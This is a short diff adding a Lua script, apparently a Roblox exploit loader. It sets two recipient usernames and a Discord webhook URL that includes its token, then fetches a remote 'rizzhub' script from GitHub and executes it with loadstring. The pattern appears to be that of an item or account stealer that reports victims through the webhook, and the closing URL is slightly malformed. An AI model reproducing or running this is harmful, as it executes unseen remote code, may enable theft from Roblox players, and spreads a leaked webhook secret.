@@ -1,0 +1,9 @@
+UserName = "robloxerdato12" 
+
+UserName2 = "robloxerdato12" 
+
+Webhook = "https://discord.com/api/webhooks/1086668017263452170/3-lMzkwCIJO5-ZWKhgrBwcu_sprVKonbyaF_f5lIbVj-75TijulqEOKlh3TMeGq4AtWc" 
+
+ 
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/k4ftt/rizzhub/main/New.lua%22))()
